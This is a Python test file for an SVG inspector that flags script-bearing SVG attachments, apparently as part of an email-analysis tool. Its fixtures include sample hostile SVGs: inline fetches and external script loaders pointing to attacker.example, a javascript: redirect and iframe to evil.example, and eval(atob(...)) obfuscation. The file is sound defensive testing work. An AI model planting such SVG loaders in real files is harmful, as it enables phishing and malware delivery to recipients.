"""SVG static inspection tests.

Covers the script-bearing-SVG detection path that feeds fetch_external_js
and IOC emission in parse_eml.
"""

from pathlib import Path

from darla.analysis.svg_inspector import (
    extract_inline_script_bodies,
    inspect_bytes,
    inspect_file,
)

# ---- Baseline: benign / passive SVG ---------------------------------------


def test_benign_svg_no_script():
    svg = b"""<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">
        <circle cx="5" cy="5" r="4" fill="blue"/>
    </svg>"""
    r = inspect_bytes(svg)
    assert r.has_script is False
    assert r.is_suspicious is False
    assert r.all_urls == []


# ---- Script presence detection -------------------------------------------


def test_inline_script_detected():
    svg = b"""<svg xmlns="http://www.w3.org/2000/svg">
        <script>fetch("https://attacker.example/stage2.js")</script>
    </svg>"""
    r = inspect_bytes(svg)
    assert r.has_script is True
    assert r.has_inline_script is True
    assert "https://attacker.example/stage2.js" in r.inline_urls
    assert r.is_suspicious is True


def test_external_script_src_detected():
    svg = b"""<svg xmlns="http://www.w3.org/2000/svg">
        <script src="https://attacker.example/loader.js"/>
    </svg>"""
    r = inspect_bytes(svg)
    assert r.has_external_script is True
    assert "https://attacker.example/loader.js" in r.script_src_urls


def test_svg_xlink_href_script_detected():
    """SVG 1.1 uses xlink:href for script external refs."""
    svg = b"""<svg xmlns="http://www.w3.org/2000/svg"
                xmlns:xlink="http://www.w3.org/1999/xlink">
        <script xlink:href="https://attacker.example/xlink-loader.js"/>
    </svg>"""
    r = inspect_bytes(svg)
    assert r.has_external_script is True
    assert "https://attacker.example/xlink-loader.js" in r.script_src_urls


def test_svg2_href_script_detected():
    """SVG 2 uses plain href on <script>."""
    svg = b"""<svg xmlns="http://www.w3.org/2000/svg">
        <script href="https://attacker.example/svg2-loader.js"/>
    </svg>"""
    r = inspect_bytes(svg)
    assert r.has_external_script is True
    assert "https://attacker.example/svg2-loader.js" in r.script_src_urls


def test_namespaced_script_tag_detected():
    """<svg:script> with xmlns prefix."""
    svg = b"""<svg xmlns:svg="http://www.w3.org/2000/svg">
        <svg:script>var x = 1;</svg:script>
    </svg>"""
    r = inspect_bytes(svg)
    assert r.has_script is True


# ---- Event handlers & javascript: URLs -----------------------------------


def test_event_handler_detected():
    svg = b"""<svg xmlns="http://www.w3.org/2000/svg">
        <circle cx="5" cy="5" r="4" onclick="alert(1)"/>
    </svg>"""
    r = inspect_bytes(svg)
    assert r.has_event_handlers is True
    assert r.is_suspicious is True
    assert any("alert(1)" in s for s in r.event_handler_snippets)


def test_javascript_url_in_href_detected():
    svg = b"""<svg xmlns="http://www.w3.org/2000/svg">
        <a href="javascript:window.location='https://evil.example'">click</a>
    </svg>"""
    r = inspect_bytes(svg)
    assert r.has_javascript_url is True
    assert r.is_suspicious is True


def test_foreign_object_detected():
    svg = b"""<svg xmlns="http://www.w3.org/2000/svg">
        <foreignObject width="100" height="100">
            <iframe src="https://evil.example"/>
        </foreignObject>
    </svg>"""
    r = inspect_bytes(svg)
    assert r.has_foreign_content is True
    assert r.is_suspicious is True


def test_use_external_href_captured():
    svg = b"""<svg xmlns="http://www.w3.org/2000/svg">
        <use xlink:href="https://attacker.example/remote.svg#target"/>
    </svg>"""
    r = inspect_bytes(svg)
    assert any("attacker.example/remote.svg" in u for u in r.use_href_urls)


# ---- Obfuscation markers -------------------------------------------------


def test_fromCharCode_obfuscation_marker():  # noqa: N802 — JS API name
    svg = b"""<svg xmlns="http://www.w3.org/2000/svg"><script>
        var s = String.fromCharCode(104,116,116,112,115);
    </script></svg>"""
    r = inspect_bytes(svg)
    assert r.has_obfuscation is True
    assert "fromcharcode" in r.obfuscation_markers


def test_atob_eval_obfuscation_markers():
    svg = b"""<svg xmlns="http://www.w3.org/2000/svg"><script>
        eval(atob("ZmV0Y2goImh0dHBzOi8veC5leCIpOw=="));
    </script></svg>"""
    r = inspect_bytes(svg)
    assert r.has_obfuscation is True
    assert "atob" in r.obfuscation_markers
    assert "eval" in r.obfuscation_markers


# ---- Malformed input resilience ------------------------------------------


def test_malformed_xml_still_inspected():
    """Broken XML must not crash the inspector — attackers intentionally break it."""
    svg = b"""<svg><script>fetch('https://a.example/x.js')</script"""  # unterminated
    r = inspect_bytes(svg)
    # We still detect the opening <script> tag even without close
    assert r.has_script is True


def test_empty_bytes_returns_benign():
    r = inspect_bytes(b"")
    assert r.has_script is False
    assert r.errors == []


def test_huge_input_truncated():
    """5MB cap — anything beyond gets truncated with an error marker."""
    huge = b"<svg>" + b"x" * (6 * 1024 * 1024)
    r = inspect_bytes(huge)
    assert any(e.startswith("truncated:") for e in r.errors)


# ---- File-based entry point ----------------------------------------------


def test_inspect_file(tmp_path: Path):
    p = tmp_path / "sample.svg"
    p.write_bytes(
        b"""<svg xmlns="http://www.w3.org/2000/svg">
            <script>fetch("https://attacker.example/x.js")</script>
        </svg>"""
    )
    r = inspect_file(p)
    assert r.has_script is True
    assert "https://attacker.example/x.js" in r.inline_urls


def test_inspect_file_missing_returns_error(tmp_path: Path):
    r = inspect_file(tmp_path / "does_not_exist.svg")
    assert any(e.startswith("read_error:") for e in r.errors)


# ---- all_urls deduplication ----------------------------------------------


def test_all_urls_dedupes_across_sources():
    svg = b"""<svg xmlns="http://www.w3.org/2000/svg">
        <script src="https://dup.example/x.js"/>
        <script>fetch("https://dup.example/x.js")</script>
    </svg>"""
    r = inspect_bytes(svg)
    # Same URL appears in both script_src_urls and inline_urls — dedup here
    assert r.all_urls.count("https://dup.example/x.js") == 1


# ---- extract_inline_script_bodies -----------------------------------------


def test_extract_inline_script_bodies_single():
    svg = b"""<svg xmlns="http://www.w3.org/2000/svg">
        <script>var a = atob("aGVsbG8=");eval(a);</script>
    </svg>"""
    bodies = extract_inline_script_bodies(svg)
    assert len(bodies) == 1
    assert 'atob("aGVsbG8=")' in bodies[0]
    assert "eval" in bodies[0]


def test_extract_inline_script_bodies_multiple():
    svg = b"""<svg>
        <script>var a = 1;</script>
        <circle/>
        <script>var b = 2;</script>
    </svg>"""
    bodies = extract_inline_script_bodies(svg)
    assert len(bodies) == 2
    assert "var a = 1" in bodies[0]
    assert "var b = 2" in bodies[1]


def test_extract_inline_script_bodies_skips_external_src():
    """A <script src="..."/> has no body — should yield nothing."""
    svg = b'<svg><script src="https://a.example/loader.js"/></svg>'
    assert extract_inline_script_bodies(svg) == []


def test_extract_inline_script_bodies_skips_whitespace_only():
    svg = b"<svg><script>   \n\t  </script></svg>"
    assert extract_inline_script_bodies(svg) == []


def test_extract_inline_script_bodies_handles_namespaced_tag():
    svg = b"<svg><svg:script>var x = 1;</svg:script></svg>"
    bodies = extract_inline_script_bodies(svg)
    assert len(bodies) == 1
    assert "var x = 1" in bodies[0]


def test_extract_inline_script_bodies_empty_input():
    assert extract_inline_script_bodies(b"") == []
